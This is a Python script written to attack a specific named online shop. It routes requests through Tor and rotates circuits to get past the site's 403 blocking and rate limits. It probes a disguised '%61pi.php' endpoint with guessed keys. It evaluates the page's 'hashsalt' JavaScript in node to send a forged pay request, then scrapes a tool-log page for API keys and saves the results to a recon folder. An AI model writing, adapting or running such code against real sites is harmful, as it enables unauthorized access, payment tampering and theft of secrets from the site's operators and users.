#!/usr/bin/env python3
"""Bypass ajax code=403; retry direct after cooldown; %61pi search/tools."""
import json
import re
import time
import subprocess
import urllib.parse
from pathlib import Path

import requests

OUT = Path("/data/recon/hyqq99.com")
BASE = "https://hyqq99.com/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}


def log(*a):
    print(*a, flush=True)


def newnym():
    try:
        import stem.control
        with stem.control.Controller.from_port(port=9051) as c:
            c.authenticate()
            c.signal(stem.Signal.NEWNYM)
            log("NEWNYM ok")
            time.sleep(3)
            return
    except Exception as e:
        log("NEWNYM skip", e)
    # fallback: restart not allowed; just sleep
    time.sleep(2)


def session(tor=True):
    s = requests.Session()
    if tor:
        s.proxies.update(PROXIES)
    s.headers.update(
        {
            "User-Agent": UA,
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
            "Referer": BASE + "/",
            "Origin": "https://hyqq99.com",
        }
    )
    s.verify = False
    requests.packages.urllib3.disable_warnings()
    return s


def main():
    results = {"tries": []}
    # 1) Tor session: home then ajax without X-Requested-With vs with
    newnym()
    s = session(True)
    r = s.get(BASE + "/", timeout=45)
    log("tor home", r.status_code, len(r.content), list(s.cookies.keys()))
    (OUT / "probe" / "ajax403_home.html").write_text(r.text, encoding="utf-8")

    # extract any token-like fields
    tokens = {
        "csrf": re.findall(r"csrf[_-]?token[\"'\s:=]+([a-zA-Z0-9]+)", r.text, re.I)[:5],
        "hashsalt_home": "hashsalt" in r.text,
    }
    log("tokens", tokens)

    for label, headers in [
        ("xhr", {"X-Requested-With": "XMLHttpRequest"}),
        ("noxhr", {}),
        ("fetch", {"X-Requested-With": "XMLHttpRequest", "Accept": "*/*"}),
    ]:
        rr = s.get(BASE + "/ajax.php?act=getcount", headers=headers, timeout=30)
        log("tor getcount", label, rr.status_code, rr.text[:200])
        results["tries"].append({"via": "tor", "label": label, "body": rr.text[:300]})

    rr = s.get(BASE + "/ajax.php?act=query&page=1", headers={"X-Requested-With": "XMLHttpRequest"}, timeout=30)
    log("tor query", rr.status_code, rr.text[:200])

    # 2) Direct (no tor) — may still be rate limited
    d = session(False)
    try:
        r = d.get(BASE + "/", timeout=20)
        log("direct home", r.status_code, len(r.content), list(d.cookies.keys()))
        rr = d.get(
            BASE + "/ajax.php?act=getcount",
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=20,
        )
        log("direct getcount", rr.status_code, rr.text[:200])
        results["direct_getcount"] = rr.text[:300]
        rr = d.get(
            BASE + "/ajax.php?act=query&page=1",
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=20,
        )
        log("direct query", rr.status_code, rr.text[:300])
        results["direct_query"] = rr.text[:500]
    except Exception as e:
        log("direct fail", e)
        results["direct_err"] = str(e)

    # 3) %61pi via tor with delays
    time.sleep(2)
    for qs in [
        "act=search&id=1",
        "act=search&id=12649",
        "act=tools&key=",
        "act=tools&key=123456&limit=1",
        "act=tools&key=hysc99&limit=1",
        "act=site",
        "act=goodslist",
    ]:
        try:
            rr = s.get(BASE + "/%61pi.php?" + qs, timeout=20)
            log("api61", qs, rr.status_code, rr.text[:220])
            results.setdefault("api61", []).append({"qs": qs, "code": rr.status_code, "body": rr.text[:400]})
        except Exception as e:
            log("api61 err", qs, e)
            results.setdefault("api61", []).append({"qs": qs, "err": str(e)[:200]})
        time.sleep(1.2)

    # 4) pay with hashsalt via tor (tid 13)
    try:
        br = s.get(BASE + "/?mod=buy&tid=13", timeout=40)
        hm = re.search(r"var hashsalt=(.+?);", br.text or "")
        hs = ""
        if hm:
            hs = subprocess.run(
                ["node", "-e", f"console.log({hm.group(1)})"],
                capture_output=True,
                text=True,
                timeout=10,
            ).stdout.strip()
        pr = s.post(
            BASE + "/ajax.php?act=pay",
            data={"tid": "13", "inputvalue": "13800138000", "num": "1", "hashsalt": hs},
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=30,
        )
        log("pay", pr.status_code, pr.text[:300], "hs", bool(hs))
        results["pay"] = pr.text[:400]
    except Exception as e:
        log("pay err", e)

    # 5) toollogs scrape
    try:
        tr = s.get(BASE + "/toollogs.php", timeout=25)
        log("toollogs", tr.status_code, len(tr.text))
        (OUT / "probe" / "toollogs.html").write_text(tr.text, encoding="utf-8")
        # look for keys/orders
        keys = re.findall(r"(key|apikey|密钥)[^<]{0,40}", tr.text, re.I)[:10]
        log("toollogs keys", keys)
    except Exception as e:
        log("toollogs err", e)

    (OUT / "dump" / "AJAX403.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("DONE")


if __name__ == "__main__":
    main()
